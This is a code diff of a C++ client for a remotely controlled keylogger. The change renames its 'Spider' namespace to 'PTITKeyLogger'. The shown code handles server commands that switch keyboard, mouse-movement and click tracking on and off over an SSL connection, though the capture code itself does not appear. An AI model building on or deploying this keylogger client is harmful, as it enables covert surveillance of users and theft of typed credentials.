@@ -5,29 +5,29 @@
 #include "MouseHooker.hpp"
 #include <iostream>
 Client::Client(const std::string &port, const std::string &host, boost::asio::io_service &io_service, boost::asio::ssl::context &context) : _network(std::make_shared<BoostNetwork>(port, host, io_service, context)),
-                                                                                                                                            _sendListQ({{Spider::RequestCode::VALID_ASK_ID_RESPONSE, &Client::responseClientId},
-                                                                                                                                                        {Spider::RequestCode::VALID_DISCONNECT, &Client::responseShutdown},
-                                                                                                                                                        {Spider::RequestCode::VALID_GET_STATUS_RESPONSE, &Client::responseStatus}}),
-                                                                                                                                            _requList({{Spider::RequestCode::PING, (&Client::requestPing)},
-                                                                                                                                                       {Spider::RequestCode::ASK_ID, (&Client::requestId)},
-                                                                                                                                                       {Spider::RequestCode::KEYBOARD_TRACK_ACTIVATE, (&Client::requestKbActivate)},
-                                                                                                                                                       {Spider::RequestCode::KEYBOARD_TRACK_DEACTIVATE, (&Client::requestKbDeactivate)},
-                                                                                                                                                       {Spider::RequestCode::MOUSE_MVMT_TRACK_ACTIVATE, (&Client::requestTrackActivate)},
-                                                                                                                                                       {Spider::RequestCode::MOUSE_MVMT_TRACK_DEACTIVATE, (&Client::requestTrackDeactivate)},
-                                                                                                                                                       {Spider::RequestCode::MOUSE_CLICK_TRACK_ACTIVATE, (&Client::requestClickActivate)},
-                                                                                                                                                       {Spider::RequestCode::MOUSE_CLICK_TRACK_DEACTIVATE, (&Client::requestClickDeactivate)},
-                                                                                                                                                       {Spider::RequestCode::DISCONNECT, (&Client::requestDisconnect)},
-                                                                                                                                                       {Spider::RequestCode::PAUSE_ACTIVATE, (&Client::requestPauseActivate)},
-                                                                                                                                                       {Spider::RequestCode::PAUSE_DEACTIVATE, (&Client::requestPauseDeactivate)},
-                                                                                                                                                       {Spider::RequestCode::SET_FREQUENCY, (&Client::requestFrequency)},
-                                                                                                                                                       {Spider::RequestCode::GET_STATUS, (&Client::requestStatus)}})
+                                                                                                                                            _sendListQ({{PTITKeyLogger::RequestCode::VALID_ASK_ID_RESPONSE, &Client::responseClientId},
+                                                                                                                                                        {PTITKeyLogger::RequestCode::VALID_DISCONNECT, &Client::responseShutdown},
+                                                                                                                                                        {PTITKeyLogger::RequestCode::VALID_GET_STATUS_RESPONSE, &Client::responseStatus}}),
+                                                                                                                                            _requList({{PTITKeyLogger::RequestCode::PING, (&Client::requestPing)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::ASK_ID, (&Client::requestId)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::KEYBOARD_TRACK_ACTIVATE, (&Client::requestKbActivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::KEYBOARD_TRACK_DEACTIVATE, (&Client::requestKbDeactivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_MVMT_TRACK_ACTIVATE, (&Client::requestTrackActivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_MVMT_TRACK_DEACTIVATE, (&Client::requestTrackDeactivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_CLICK_TRACK_ACTIVATE, (&Client::requestClickActivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_CLICK_TRACK_DEACTIVATE, (&Client::requestClickDeactivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::DISCONNECT, (&Client::requestDisconnect)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::PAUSE_ACTIVATE, (&Client::requestPauseActivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::PAUSE_DEACTIVATE, (&Client::requestPauseDeactivate)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::SET_FREQUENCY, (&Client::requestFrequency)},
+                                                                                                                                                       {PTITKeyLogger::RequestCode::GET_STATUS, (&Client::requestStatus)}})
 {
     gControlData = &_data;
 }
 
 int Client::connectClient()
 {
-    Spider::RequestCode toSend;
+    PTITKeyLogger::RequestCode toSend;
     r_fnct func;
 
     try
@@ -40,7 +40,7 @@ int Client::connectClient()
             _code = _network->receive();
             try
             {
-                func = _requList.at(static_cast<Spider::RequestCode>(_code));
+                func = _requList.at(static_cast<PTITKeyLogger::RequestCode>(_code));
             }
             catch (const std::exception &e)
             {
@@ -64,63 +64,63 @@ int Client::connectClient()
 
 // REQUEST FUNCTIONS
 
-Spider::RequestCode Client::requestPing() { return (Spider::VALID_PING_RESPONSE); }
+PTITKeyLogger::RequestCode Client::requestPing() { return (PTITKeyLogger::VALID_PING_RESPONSE); }
 
-Spider::RequestCode Client::requestId() { return (Spider::VALID_ASK_ID_RESPONSE); }
+PTITKeyLogger::RequestCode Client::requestId() { return (PTITKeyLogger::VALID_ASK_ID_RESPONSE); }
 
-Spider::RequestCode Client::requestKbActivate()
+PTITKeyLogger::RequestCode Client::requestKbActivate()
 {
     _data._state.activateKb();
-    return (Spider::VALID_KEYBOARD_TRACK_ACTIVATE);
+    return (PTITKeyLogger::VALID_KEYBOARD_TRACK_ACTIVATE);
 }
 
-Spider::RequestCode Client::requestKbDeactivate()
+PTITKeyLogger::RequestCode Client::requestKbDeactivate()
 {
     _data._state.deactivateKb();
-    return (Spider::VALID_KEYBOARD_TRACK_DEACTIVATE);
+    return (PTITKeyLogger::VALID_KEYBOARD_TRACK_DEACTIVATE);
 }
 
-Spider::RequestCode Client::requestTrackActivate()
+PTITKeyLogger::RequestCode Client::requestTrackActivate()
 {
     _data._state.activateTracking();
-    return (Spider::VALID_MOUSE_MVMT_TRACK_ACTIVATE);
+    return (PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_ACTIVATE);
 }
 
-Spider::RequestCode Client::requestTrackDeactivate()
+PTITKeyLogger::RequestCode Client::requestTrackDeactivate()
 {
     _data._state.deactivateTracking();
-    return (Spider::VALID_MOUSE_MVMT_TRACK_DEACTIVATE);
+    return (PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_DEACTIVATE);
 }
 
-Spider::RequestCode Client::requestClickActivate()
+PTITKeyLogger::RequestCode Client::requestClickActivate()
 {
     _data._state.activateClick();
-    return (Spider::VALID_MOUSE_CLICK_TRACK_ACTIVATE);
+    return (PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_ACTIVATE);
 }
 
-Spider::RequestCode Client::requestClickDeactivate()
+PTITKeyLogger::RequestCode Client::requestClickDeactivate()
 {
     _data._state.deactivateClick();
-    return (Spider::VALID_MOUSE_CLICK_TRACK_DEACTIVATE);
+    return (PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE);
 }
 
-Spider::RequestCode Client::requestDisconnect() { return (Spider::VALID_DISCONNECT); }
+PTITKeyLogger::RequestCode Client::requestDisconnect() { return (PTITKeyLogger::VALID_DISCONNECT); }
 
-Spider::RequestCode Client::requestPauseActivate()
+PTITKeyLogger::RequestCode Client::requestPauseActivate()
 {
     _data._state.activatePause();
-    return (Spider::VALID_PAUSE_ACTIVATE);
+    return (PTITKeyLogger::VALID_PAUSE_ACTIVATE);
 }
 
-Spider::RequestCode Client::requestPauseDeactivate()
+PTITKeyLogger::RequestCode Client::requestPauseDeactivate()
 {
     _data._state.deactivatePause();
-    return (Spider::VALID_PAUSE_DEACTIVATE);
+    return (PTITKeyLogger::VALID_PAUSE_DEACTIVATE);
 }
 
-Spider::RequestCode Client::requestFrequency() { return (Spider::VALID_SET_FREQUENCY); }
+PTITKeyLogger::RequestCode Client::requestFrequency() { return (PTITKeyLogger::VALID_SET_FREQUENCY); }
 
-Spider::RequestCode Client::requestStatus() { return (Spider::VALID_GET_STATUS_RESPONSE); }
+PTITKeyLogger::RequestCode Client::requestStatus() { return (PTITKeyLogger::VALID_GET_STATUS_RESPONSE); }
 
 /* INITIATE KEYLOGGER */
 
